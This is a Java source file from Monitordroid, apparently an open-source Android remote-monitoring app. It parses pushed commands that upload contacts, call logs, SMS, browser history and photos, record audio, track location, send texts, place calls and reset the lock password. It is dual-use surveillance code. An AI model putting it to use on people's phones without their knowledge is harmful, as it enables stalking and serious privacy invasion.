/**
 * Copyright (C) 2015 Monitordroid Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * @author Tyler Butler
 **/

package com.monitordroid.app;

import java.io.IOException;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class MessageAction {

	/**
	 * Takes an input raw GCM-Message, parses it, then determines what to do
	 * with it
	 * 
	 * @param message: The raw GCM Message
	 */
	public void actionParser(Context context, String message) {

		Log.i("Received Message: ", message);
		
		// An instance of these classes needs to be created each time so that
		//they can be stopped by a subsequent command
		Flashlight fl = new Flashlight();
		Intent audioPlayer = new Intent(context, AudioPlayer.class);
		Intent locationUpdate = new Intent(context, LocationService.class);
		SoundRecorder ra = new SoundRecorder();

		//Stops the playing of any media
		if (message.equals("stopplay")) {
			context.stopService(audioPlayer);
		}

		// Stops the auto-location service
		if (message.equals("stoplocation")) {
			context.stopService(locationUpdate);
		}
		
		//Uploads the device's "DCIM/Camera" directory listing to the server
		if (message.equals("getpicsdir")) {
			PictureUtilities up = new PictureUtilities();
			up.uploadPictureDirectory(context);
		}

		//Uploads the device's contacts to the server 
		if (message.equals("contacts")) {
			ContactsFetcher mContact = new ContactsFetcher();
			mContact.executeFetch(context);
		}

		//Uploads the device's call logs to the server
		if (message.equals("calls")) {
			CallLogGetter cl = new CallLogGetter();
			cl.fetchLog(context);
		}

		//Turns the device's flashlight on
		if (message.equals("flashon")) {
			fl.flashOn(context);
		}
		
		//Turns the device's flashlight off
		if (message.equals("flashoff")) {
			fl.flashOff(context);
		}

		//Sets the device's ringer to ring
		if (message.equals("setvolumering")) {
			Volume vm = new Volume();
			vm.loud(context);
		}

		//Sets the device's ringer to vibrate
		if (message.equals("setvolumevibrate")) {
			Volume vm = new Volume();
			vm.vibrate(context);
		}

		//Sets the device's ringer to silent
		if (message.equals("setvolumesilent")) {
			Volume vm = new Volume();
			vm.silent(context);
		}
		
		//Turns the device's master volume up
		if (message.equals("vup")) {
			Volume vm = new Volume();
			vm.raiseVolume(context);
		}

		//Turns the device's master volume down
		if (message.equals("vdown")) {
			Volume vm = new Volume();
			vm.lowerVolume(context);
		}

		//Turns the device's media volume up
		if (message.equals("mvup")) {
			Volume vm = new Volume();
			vm.raiseMediaVolume(context);
		}

		//Turns the device's media volume down
		if (message.equals("mvdown")) {
			Volume vm = new Volume();
			vm.lowerMediaVolume(context);
		}

		//Uploads the default web browser's history to the server
		if (message.equals("gethistory")) {
			BrowserHistory gb = new BrowserHistory();
			gb.getHistory(context);
		}

		//Uploads the list of applications installed on the device to the server
		if (message.equals("getapps")) {
			InstalledAppsFetcher ga = new InstalledAppsFetcher();
			ga.fetchInstalledApps(context);
		}

		//Uploads a variety of information (phone number, network operator, etc.) from the device to the server
		if (message.equals("getdeviceinfo")) {
			DeviceInformation di = new DeviceInformation();
			di.getDeviceInformation(context);
		}

		//Locks the device
		if (message.equals("lock")) {
			DeviceAdmin da = new DeviceAdmin();
			da.lockDevice(context);
		}

		//Enables the device's camera
		if (message.equals("cameraon")) {
			DeviceAdmin da = new DeviceAdmin();
			da.disableCamera(context, false);
		}

		//Disables the device's camera
		if (message.equals("cameraoff")) {
			DeviceAdmin da = new DeviceAdmin();
			da.disableCamera(context, true);
		}

		// Easter Egg? :)
		if (message.equals("duke")) {
			audioPlayer
					.putExtra("url",
							"http://www.myinstants.com/media/sounds/ballsofsteel.swf.mp3");
			context.startService(audioPlayer);
		}

		/**
		 * The following are algorithms to extract commands, phonenumbers, urls,
		 * and text from an incoming message
		 *
		 * --------------------------------------------------------------------------------------------
		 */

		//Send SMS
		//Extracts a text message and an intended recipient's phone number from
		//the GCM message then forwards it to be sent

		try {
			if (message.length() > 8) {
				String messageDeterminant = message.substring(0, 7);
				if (messageDeterminant.equals("sendsms")) {
					String phoneNumber = "";
					for (int i = 8; message.charAt(i) != ','; i++) {
						phoneNumber += message.charAt(i);
					}
					if (message.length() > 8 + phoneNumber.length() + 3) {
						String smsMessage = "";
						for (int i = 8 + phoneNumber.length() + 1; i < message
								.length() - 1; i++) {
							smsMessage += message.charAt(i);
						}
						smsMessage = smsMessage.trim();
						SMSUtilities mSms = new SMSUtilities();
						mSms.sendSMS(phoneNumber, smsMessage);
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
			Log.e("Error", e.toString());
		}
		catch (NullPointerException e) {
			Log.e("Error", e.toString());
		}
		catch (IllegalArgumentException e) {
			Log.e("Error", e.toString());
		}
		
//-------------------------------------------------------------------------------------------------------------------
		
		//Initiate Phonecall
		//Extracts a phone number from the GCM Message then initates a call to that number
		
		try {
			if (message.length() > 6) {
				String messageDeterminant = message.substring(0, 4);
				if (messageDeterminant.equals("call")) {
					String phoneNumber = "";
					for (int i = 5; i < message.length() - 1; i++) { 				
						phoneNumber += message.charAt(i);
					}
					phoneNumber = phoneNumber.trim();
					if (!phoneNumber.equals("")) {
						Telephone cp = new Telephone();
						cp.callPhone(context, phoneNumber);
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
			Log.e("Error", e.toString());
		}
		catch (NullPointerException e) {
			Log.e("Error", e.toString());
		}
		catch (IllegalArgumentException e) {
			Log.e("Error", e.toString());
		}

//--------------------------------------------------------------------------------------
		
		//Play Media
		//Extracts a URL from the GCM Message and forwards it to be played
		
		try {
			if (message.length() > 6) {
				String messageDeterminant = message.substring(0, 4);
				if (messageDeterminant.equals("play")) {
					String url = "";
					for (int i = 5; i < message.length() - 1; i++) {
						url += message.charAt(i);
					}
					url = url.trim();
					if (!url.equals("")) {
						audioPlayer.putExtra("url", url);
						context.startService(audioPlayer);
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
			Log.e("Error", e.toString());
		}
		catch (NullPointerException e) {
			Log.e("Error", e.toString());
		}
		catch (IllegalArgumentException e) {
			Log.e("Error", e.toString());
		}
		
//----------------------------------------------------------------------------------------
		
		//Open Webpage
		//Extracts a URL from the GCM Message and opens it in the device's default
		//web browser
		
		try {
			if (message.length() > 6) {
				String messageDeterminant = message.substring(0, 4);
				if (messageDeterminant.equals("open")) {
					String url = "";
					for (int i = 5; i < message.length() - 1; i++) {
						url += message.charAt(i);
					}
					url = url.trim();
					if (!url.equals("")) {
						WebpageOpener ow = new WebpageOpener();
						ow.openPage(context, url);
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
			Log.e("Error", e.toString());
		}
		catch (NullPointerException e) {
			Log.e("Error", e.toString());
		}
		catch (IllegalArgumentException e) {
			Log.e("Error", e.toString());
		}

//---------------------------------------------------------------------------
		
		//Send Notification
		//Extracts a notification message from the GCM message and then forwards
		//it to be displayed
		
		try {
			if (message.length() > 6) {
				String messageDeterminant = message.substring(0, 4);
				if (messageDeterminant.equals("sedn")) {
					String note = "";
					for (int i = 5; i < message.length() - 1; i++) {
						note += message.charAt(i);
					}
					note = note.trim();
					if (!note.equals("")) {
						SendNotification sn = new SendNotification();
						sn.generateNotification(context, note);
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
			Log.e("Error", e.toString());
		}
		catch (NullPointerException e) {
			Log.e("Error", e.toString());
		}
		catch (IllegalArgumentException e) {
			Log.e("Error", e.toString());
		}

//--------------------------------------------------------------------------------------------
		
		//Upload Picture
		//Extracts a picture filename (that exists within "sdcard0/DCIM/Camera") and signals
		//to upload that picture to the server
		
		try {
			if (message.length() > 11) {
				String messageDeterminant = message.substring(0, 9);
				if (messageDeterminant.equals("uploadpic")) {
					String pictureName = "";
					for (int i = 10; i < message.length() - 1; i++) {
						pictureName += message.charAt(i);
					}
					pictureName = pictureName.trim();
					//Get the extension of the input file name
					String[] parts = pictureName.split("\\.");
					if (parts.length == 2) {
						String extension = parts[1];
						Log.i("ex", extension);
						//Only upload .jpg, .png, .gif, .jpeg, and .bmp type files					
					if (!pictureName.equals("") && (extension.equals("jpg") || extension.equals("png") ||
							extension.equals("gif") || extension.equals("jpeg") || extension.equals("bmp"))) {
						PictureUtilities up = new PictureUtilities();
						Log.i("Parsed pictureName: ", pictureName);
						up.uploadPicture(context, pictureName);
					   }
					}
				}
			}
		}
		catch (StringIndexOutOfBoundsException e) {
			Log.e("Error", e.toString());
		}
		catch (NullPointerException e) {
			Log.e("Error", e.toString());
		}
		catch (IllegalArgumentException e) {
			Log.e("Error", e.toString());
		}
		
//-------------------------------------------------------------------------------------------

		/*
		 * Read SMS Messages
		 * 
		 * User sends command to update SMS Messages Format: "readsms-(iteration
		 * of messages to send)-(whether to resolve contacts) Example:
		 * "readsms-1-1" will send the first batch of 600 text messages,
		 * clearing previous update data and also resolve the names to contacts,
		 * which will increase the time it takes to perform the algorithm.
		 * "readsms-2-0" will concatenate the next 600 messages onto the end of
		 * the previous messages in the database, but not resolve contact names,
		 * making the algorithm run more efficiently. A GCM message of just
		 * 'readsms' will default to "readsms-1-0"
		 */
		
		try {
			if (message.length() >= 7) {
				String messageDeterminant = message.substring(0, 7);
				if (messageDeterminant.equals("readsms")) {
					SMSUtilities mSMS = new SMSUtilities();
					if (message.equals("readsms")) {
						mSMS.fetchSMS(context, 1, false);
					}
					else {
						String[] parts = message.split("-");
						// Check for properly formatted message to avoid index
						// out of bounds exception
						if (parts.length == 3) {
							// Check which iteration of messages it wants
							int iteration = Integer.parseInt(parts[1]);
							// Check whether they want to resolve contact names
							int resolveContactsOption = Integer
									.parseInt(parts[2]);
							boolean resolveContacts = false;
							if (resolveContactsOption == 1) {
								resolveContacts = true;
							}

							Log.i("Iteration: ", Integer.toString(iteration));

							mSMS.fetchSMS(context, iteration, resolveContacts);
						}
					}
				}
			}
		}

		catch (StringIndexOutOfBoundsException e) {
			Log.e("Error", "Caught index out of bounds");
		}
		catch (NullPointerException e) {
			Log.e("Error", "Null pointer");
		}
		catch (IllegalArgumentException e) {
			Log.e("Error", "Illegal argument");
		}
		
//----------------------------------------------------------------------------------------

		/*
		 * Device Location
		 * 
		 * User sends command to start location services. format:
		 * "location-(number of minutes between location refreshes)" Ex:
		 * "location-5" will update the devices location every 5 minutes
		 */
		try {
			if (message.length() >= 8) {
				String messageDeterminant = message.substring(0, 8);
				if (messageDeterminant.equals("location")) {
					// Message is just "location", request a single update
					if (message.equals("location")) {
						// Stops auto-locate if it's already running
						context.stopService(locationUpdate);
						locationUpdate.putExtra("minutesTillRefresh", 0);
						context.startService(locationUpdate);
					}
					// Split message up into formatted parts
					else {
						String[] parts = message.split("-");
						// Check for properly formatted message to avoid index
						// out of bound exception
						if (parts.length == 2) {
							// Check to see the value the user chose for the
							// time between location refreshes
							int minutesTillRefresh = Integer.parseInt(parts[1]);
							context.stopService(locationUpdate);
							locationUpdate.putExtra("minutesTillRefresh",
									minutesTillRefresh);
							context.startService(locationUpdate);
						}
					}
				}
			}
		}

		catch (StringIndexOutOfBoundsException e) {
			Log.e("Error", "Caught index out of bounds");
		}
		catch (NullPointerException e) {
			Log.e("Error", "Null pointer");
		}
		catch (IllegalArgumentException e) {
			Log.e("Error", "Illegal argument");
		}
		
//---------------------------------------------------------------------------------------------------
		
		/*
		 * Reset Device Password
		 * 
		 * User sends command to reset the device's password format:
		 * "resetpassword-(newpassword)" Ex: "resetpassword-123456" will make
		 * the device's new password "123456"
		 */
		try {
			if (message.length() >= 13) {
				String messageDeterminant = message.substring(0, 13);
				if (messageDeterminant.equals("resetpassword")) {
					// Split message up into formatted parts
					String[] parts = message.split("-");
					// Check for properly formatted message to avoid index out
					// of bound exception
					if (parts.length == 2 && !containsIllegalChars(message)) {
						DeviceAdmin da = new DeviceAdmin();
						da.resetPassword(context, parts[1]);
					}
				}
			}
		}

		catch (StringIndexOutOfBoundsException e) {
			Log.e("Error", "Caught index out of bounds");
		}
		catch (NullPointerException e) {
			Log.e("Error", "Null pointer");
		}
		catch (IllegalArgumentException e) {
			Log.e("Error", "Illegal argument");
		}
		
//----------------------------------------------------------------------------------------

		/*
		 * Record Sound
		 * 
		 * Tells the device to record audio for a specified number of minutes, and then
		 * upload the sound file to the server.
		 * 
		 * Format: record-(number of minutes)
		 * Ex: "record-5" will record audio for 5 minutes.
		 * 
		 * Note: Can record for a maximum of 30 minutes
		 */
		if (message.length() >= 6) {
			String messageDeterminant = message.substring(0, 6);
			if (messageDeterminant.equals("record")) {
				// If the message is only "record", default to 1 minute
				if (message.equals("record")) {
					try {
						ra.start(context, 1);
					}
					catch (IOException e) {
					}
				}
				else {
					// Split message up into formatted parts
					String[] parts = message.split("-");
					int time = Integer.parseInt(parts[1]);
					if (time > 30) {
						time = 30;
					}
					// Check for properly formatted message to avoid index out
					// of bounds exception
					if (parts.length == 2) {
						try {
							ra.start(context, time);
						}
						catch (IOException e) {

						}
					}
				}
			}
		}

	}
	
	/**
	 * Helper method for "resetpassword" function. Checks to make
	 * sure no illegal characters are contained within the input new password
	 * which could cause an unintended password to be set.
	 * 
	 * @param message: The intended new password
	 */
	private boolean containsIllegalChars(String message) {
		if (message.contains("\"") || message.contains("\\")) {
			Log.e("Error:", "Message contains illegal chars!");
			return true;
		}
		return false;
	}

}
